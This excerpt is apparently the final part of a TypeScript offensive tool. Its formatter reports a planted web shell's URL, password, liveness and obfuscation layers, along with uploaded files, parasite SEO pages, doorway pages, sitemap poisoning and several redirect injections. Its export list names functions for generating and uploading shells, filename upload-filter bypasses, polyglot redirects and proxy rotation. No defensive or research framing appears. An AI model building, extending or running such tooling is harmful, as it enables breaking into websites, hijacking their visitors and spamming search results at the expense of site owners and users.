    lines.push(`── Shell Info ──`);
    lines.push(`URL: ${result.shellInfo.url}`);
    lines.push(`Password: ${result.shellInfo.password}`);
    lines.push(`Active: ${result.shellInfo.active ? "YES" : "NO"}`);
    lines.push(`Recheck: ${result.shellInfo.recheckActive === undefined ? "N/A" : result.shellInfo.recheckActive ? "YES" : "NO"}`);
    lines.push(`Obfuscation: ${result.shellInfo.obfuscationLayers} layers`);
    lines.push(``);
  }

  lines.push(`── Deployed Files ──`);
  for (const file of result.deployedFiles) {
    const icon = file.status === "deployed" ? "✅" : "❌";
    lines.push(`${icon} ${file.filename} (${file.description})${file.url ? ` → ${file.url}` : ""}`);
  }
  lines.push(``);

  // Direct Upload Info
  if (result.directUploadInfo.attempted) {
    lines.push(`── Direct Upload ──`);
    lines.push(`  Attempted: YES`);
    lines.push(`  Success: ${result.directUploadInfo.successCount}`);
    lines.push(`  Failed: ${result.directUploadInfo.failedCount}`);
    for (const f of result.directUploadInfo.uploadedFiles) {
      lines.push(`  ✅ ${f.filename} (${f.type}) via ${f.method}${f.url ? ` → ${f.url}` : ""}`);
    }
    lines.push(``);
  }

  // Parasite SEO Info
  if (result.parasiteInfo.generated) {
    lines.push(`\u2500\u2500 SEO Parasite Pages \u2500\u2500`);
    lines.push(`  Pages Generated: ${result.parasiteInfo.pagesCount}`);
    lines.push(`  Total Word Count: ${result.parasiteInfo.totalWordCount}`);
    lines.push(`  Avg SEO Score: ${result.parasiteInfo.avgSeoScore}/100`);
    for (const p of result.parasiteInfo.pages) {
      const icon = p.deployed ? "\u2705" : "\u274C";
      lines.push(`  ${icon} ${p.filename} - ${p.title} (${p.wordCount}w, SEO:${p.seoScore})${p.url ? ` \u2192 ${p.url}` : ""}`);
    }
    lines.push(``);
  }

  lines.push(`\u2500\u2500 Redirect Status \u2500\u2500`);
  lines.push(`  Direct Upload: ${result.redirectInfo.directUploadUsed ? "⚡ YES" : "❌"}`);
  lines.push(`  .htaccess: ${result.redirectInfo.htaccessDeployed ? "✅" : "❌"}`);
  lines.push(`  PHP 302: ${result.redirectInfo.phpRedirectDeployed ? "✅" : "❌"}`);
  lines.push(`  JS Redirect: ${result.redirectInfo.jsRedirectDeployed ? "✅" : "❌"}`);
  lines.push(`  Meta Refresh: ${result.redirectInfo.metaRefreshDeployed ? "✅" : "❌"}`);
  lines.push(`  Geo Redirect: ${result.redirectInfo.geoRedirectDeployed ? "✅" : "❌"}`);
  lines.push(`  Doorway Pages: ${result.redirectInfo.doorwayPagesDeployed}`);
  lines.push(`  Sitemap Poisoned: ${result.redirectInfo.sitemapPoisoned ? "✅" : "❌"}`);
  lines.push(`  Verified Working: ${result.redirectInfo.verifiedWorking ? "✅" : "❌"}`);
  lines.push(``);

  lines.push(`── Summary ──`);
  lines.push(`  Steps: ${result.summary.successSteps}✅ ${result.summary.failedSteps}❌ ${result.summary.skippedSteps}⏭️`);
  lines.push(`  Files Deployed: ${result.summary.totalFilesDeployed}`);
  lines.push(`  Redirect Active: ${result.summary.redirectActive ? "YES ✅" : "NO ❌"}`);
  lines.push(`  Total Retries: ${result.summary.totalRetries}`);
  lines.push(`  Duration: ${(result.summary.totalDuration / 1000).toFixed(1)}s`);

  return lines.join("\n");
}

// ═══════════════════════════════════════════════════════
//  EXPORTS for testing
// ═══════════════════════════════════════════════════════

export {
  scanTarget,
  generateShell,
  uploadShell,
  verifyShellActive,
  deployFiles,
  verifyRedirect,
  generateDoorwayPage,
  generateHtaccessRedirect,
  generatePhpRedirect,
  generateJsRedirect,
  generateSitemapPoison,
  generateGeoRedirectPhp,
  generateDefaultLandingHtml,
  generateFilenameBypassVariants,
  getTopFilenameVariants,
  generateRedirectPayloads,
  generateSeoKeywordBlock,
  uploadRedirectDirect,
  verifyUploadedFile,
  verifyUploadedFileDetailed,
  verifyRedirectActuallyWorks,
  generatePolyglotRedirect,
  generateHtmlJsRedirect,
  generatePolyglotGeoRedirect,
  classifyError,
  normalizeUrl,
  withRetry,
  sleep,
  // Proxy & weighted redirect helpers
  getNextProxy,
  fetchWithProxy,
  selectWeightedRedirect,
  parseProxyList,
  parseWeightedRedirects,
};
